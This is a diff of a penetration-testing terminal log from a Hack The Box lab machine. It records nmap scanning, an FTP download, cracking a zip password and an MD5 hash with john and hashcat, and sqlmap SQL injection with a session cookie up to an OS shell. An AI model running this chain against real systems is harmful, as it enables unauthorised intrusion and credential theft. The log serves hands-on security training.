@@ -1,4 +1,4 @@
-2cb42f8734ea607eefed3b70af13bbd3┌──(kali㉿kali)-[~/HTB]
+2cb42f8734ea607eefed3b70af13bbd3┌──(kali@kali)-[~/HTB]
 └─$ dsza4rt~y~~~~~`     ~]=~OP~7~8~9~0-P[=]\
 bquote> .HEGFWBDQSC                                                                
 bquote> .HEGFWBDQSCsXsZGVY2H3BUI4NKO5MLP,HY,JM7IR67UE54Y6WT3R2ZSAqszXDC r,VQBgwnsmhejda<O>)|:_}2~P";2~t~-[ r~peow~9~i8~q7~~543a23we45r~t6~y7~
@@ -7,10 +7,10 @@ bquote> ip akm
 bquote> ssc
 bquote> 
                                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ 
                                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ nmap -sC -sV 10.129.120.3  
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-27 22:00 EDT
 Nmap scan report for 10.129.120.3
@@ -50,7 +50,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.58 seconds
                                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ ftp 10.129.120.3                                  
 Connected to 10.129.120.3.
 220 (vsFTPd 3.0.3)
@@ -82,26 +82,26 @@ local: backup.zip remote: backup.zip
 ftp> exit
 221 Goodbye.
                                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ ls
 academy.ovpn  backup.zip  htb_machine.ovpn  machine.ovpn  new_machine.ovpn  OSCP.ovpn  season.ovpn  starting_vip.ovpn
                                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ unzip backup.zip         
 Archive:  backup.zip
 [backup.zip] index.php password: 
    skipping: index.php               incorrect password
    skipping: style.css               incorrect password
                                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ ls
 academy.ovpn  backup.zip  htb_machine.ovpn  machine.ovpn  new_machine.ovpn  OSCP.ovpn  season.ovpn  starting_vip.ovpn
                                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ john --hlp                                       
 Unknown option: "--hlp"
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ john --help               
 John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 AVX AC]
 Copyright (c) 1996-2021 by Solar Designer and others
@@ -219,7 +219,7 @@ Usage: john [OPTIONS] [PASSWORD-FILES]
                            See also doc/OPTIONS for more advanced selection of
                            format(s), including using classes and wildcards.
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ zip2john > hashes    
 Usage: zip2john [options] [zip file(s)]
  -s Scan archive from the beginning, looking for local file headers. This
@@ -241,7 +241,7 @@ NOTE: By default it is assumed that all files in each archive have the same
 password. If that's not the case, the produced hash may be uncrackable.
 To avoid this, use -o option to pick a file at a time.
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ zip2john backup.zip > hashes
 ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
 ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
@@ -249,33 +249,33 @@ NOTE: It is assumed that all files in each archive have the same password.
 If that is not the case, the hash may be uncrackable. To avoid this, use
 option -o to pick a file at a time.
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ ls
 academy.ovpn  backup.zip  hashes  htb_machine.ovpn  machine.ovpn  new_machine.ovpn  OSCP.ovpn  season.ovpn  starting_vip.ovpn
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ cat hashes    
 backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ john -wordlist=/usr/share/wordlist/rockyou.txt hashes
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
 Will run 4 OpenMP threads
 fopen: /usr/share/wordlist/rockyou.txt: No such file or directory
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ find "rockyou.txt"                                   
 find: ‘rockyou.txt’: No such file or directory
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ cd ../../../                       
                                                                                                                                              
-┌──(kali㉿kali)-[/]
+┌──(kali@kali)-[/]
 └─$ find "rockyou.txt"
 find: ‘rockyou.txt’: No such file or directory
                                                                                                                                              
-┌──(kali㉿kali)-[/]
+┌──(kali@kali)-[/]
 └─$ find -help        
 Usage: find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]
 
@@ -323,41 +323,41 @@ program via the GNU findutils bug-reporting page at
 https://savannah.gnu.org/bugs/?group=findutils or, if
 you have no web access, by sending email to <bug-findutils@gnu.org>.
                                                                                                                                              
-┌──(kali㉿kali)-[/]
+┌──(kali@kali)-[/]
 └─$ cd ../\                                                                    
 > ls
 cd: no such file or directory: ../ls
                                                                                                                                              
-┌──(kali㉿kali)-[/]
+┌──(kali@kali)-[/]
 └─$ ls
 bin   dev  home        initrd.img.old  lib32  lost+found  mnt  proc  run   srv   sys  usr  vmlinuz
 boot  etc  initrd.img  lib             lib64  media       opt  root  sbin  swap  tmp  var  vmlinuz.old
                                                                                                                                              
-┌──(kali㉿kali)-[/]
+┌──(kali@kali)-[/]
 └─$ cd ../../   
                                                                                                                                              
-┌──(kali㉿kali)-[/]
+┌──(kali@kali)-[/]
 └─$ ls
 bin   dev  home        initrd.img.old  lib32  lost+found  mnt  proc  run   srv   sys  usr  vmlinuz
 boot  etc  initrd.img  lib             lib64  media       opt  root  sbin  swap  tmp  var  vmlinuz.old
                                                                                                                                              
-┌──(kali㉿kali)-[/]
+┌──(kali@kali)-[/]
 └─$ locate "rockyou.txt"
 /home/kali/SecLists-master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
 /usr/share/wordlists/rockyou.txt
                                                                                                                                              
-┌──(kali㉿kali)-[/]
+┌──(kali@kali)-[/]
 └─$ john -wordlist=/usr/share/wordlists/rockyou.txt hashes
 stat: hashes: No such file or directory
                                                                                                                                              
-┌──(kali㉿kali)-[/]
+┌──(kali@kali)-[/]
 └─$ cd ~/HTB                                              
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ ls                  
 academy.ovpn  backup.zip  hashes  htb_machine.ovpn  machine.ovpn  new_machine.ovpn  OSCP.ovpn  season.ovpn  starting_vip.ovpn
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ john -wordlist=/usr/share/wordlists/rockyou.txt hashes
 Using default input encoding: UTF-8
 Loaded 1 password hash (PKZIP [32/64])
@@ -368,7 +368,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ unzip backup.zip                                      
 Archive:  backup.zip
 [backup.zip] index.php password: 
@@ -378,28 +378,28 @@ password incorrect--reenter:
 [backup.zip] style.css password: 
 password incorrect--reenter: 
 password incorrect--reenter:                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ john --show hashes                                    
 backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
 
 1 password hash cracked, 0 left
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ unzip backup.zip  
 Archive:  backup.zip
 [backup.zip] index.php password: 
   inflating: index.php               
   inflating: style.css               
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ ls
 academy.ovpn  hashes            index.php     new_machine.ovpn  season.ovpn        style.css
 backup.zip    htb_machine.ovpn  machine.ovpn  OSCP.ovpn         starting_vip.ovpn
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ open .    
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ hashid 2cb42f8734ea607eefed3b70af13bbd3                
 Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
 [+] MD2 
@@ -421,15 +421,15 @@ Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
 [+] DNSSEC(NSEC3) 
 [+] RAdmin v2.x 
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ echo '2cb42f8734ea607eefed3b70af13bbd3' > hash
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ hashcat -a O -m O hash /user/share/wordlists/rockyou.txt
 The specified parameter cannot use 'O' as a value - must be a number.
 
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ hashcat -a 0 -m 0 hash /user/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
 
@@ -438,12 +438,12 @@ hashcat (v6.2.6) starting
 Started: Sun Jul 27 22:32:27 2025
 Stopped: Sun Jul 27 22:32:27 2025
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ hashcat -a O -m O hash /usr/share/wordlists/rockyou.txt 
 The specified parameter cannot use 'O' as a value - must be a number.
 
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ hashcat  hash /usr/share/wordlists/rockyou.txt 
 hashcat (v6.2.6) starting in autodetect mode
 
@@ -472,12 +472,12 @@ Please specify the hash-mode with -m [hash-mode].
 Started: Sun Jul 27 22:33:10 2025
 Stopped: Sun Jul 27 22:33:12 2025
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ hashcat -m  hash /usr/share/wordlists/rockyou.txt 
 The specified parameter cannot use 'hash' as a value - must be a number.
 
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ hashcat -m 1  hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
 
@@ -490,7 +490,7 @@ correct and that the files are in the correct place.
 Started: Sun Jul 27 22:33:41 2025
 Stopped: Sun Jul 27 22:33:41 2025
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
 
@@ -552,7 +552,7 @@ Candidates.#1....: Dominic1 -> paashaas
 Hardware.Mon.#1..: Util: 32%
 
 Started: Sun Jul 27 22:33:50 2025
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' -- coockie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s"
         ___
        __H__
@@ -597,7 +597,7 @@ it is recommended to perform only basic UNION tests if there is not at least one
 [*] ending @ 22:43:46 /2025-07-27/
 
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' -- coockie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s"
         ___
        __H__
@@ -642,7 +642,7 @@ it is recommended to perform only basic UNION tests if there is not at least one
 [*] ending @ 22:45:16 /2025-07-27/
 
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' -- cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s" 
         ___
        __H__                                                                                                                                 
@@ -653,7 +653,7 @@ it is recommended to perform only basic UNION tests if there is not at least one
 
 [!] detected usage of long-option without a starting hyphen ('cookie=PHPSESSID=h3vh8re0726sti8a5sijbgm03s')
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' --cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s" 
         ___
        __H__                                                                                                                                 
@@ -714,7 +714,7 @@ back-end DBMS: PostgreSQL
 [*] ending @ 22:46:49 /2025-07-27/
 
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' --cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s"--os-shell
         ___
        __H__                                                                                                                                 
@@ -751,7 +751,7 @@ back-end DBMS: PostgreSQL
 [*] ending @ 22:47:45 /2025-07-27/
 
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' --cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s"--os-shell
         ___
        __H__                                                                                                                                 
@@ -788,7 +788,7 @@ back-end DBMS: PostgreSQL
 [*] ending @ 22:48:19 /2025-07-27/
 
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' --cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s" --os-shell
         ___
        __H__                                                                                                                                 
@@ -886,7 +886,7 @@ os-shell> exit
 [*] ending @ 22:48:59 /2025-07-27/
 
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' --cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s" --os-shell
         ___
        __H__                                                                                                                                 
@@ -959,7 +959,7 @@ do you want to retrieve the command standard output? [Y/n/a]
 [*] ending @ 22:54:51 /2025-07-27/
 
                                                                                                                                              
-┌──(kali㉿kali)-[~/HTB]
+┌──(kali@kali)-[~/HTB]
 └─$ sqlmap -u 'http://10.129.120.3/dashboard.php?search=any+query' --cookie="PHPSESSID=h3vh8re0726sti8a5sijbgm03s" --os-shell
         ___
        __H__                                                                                                                                 
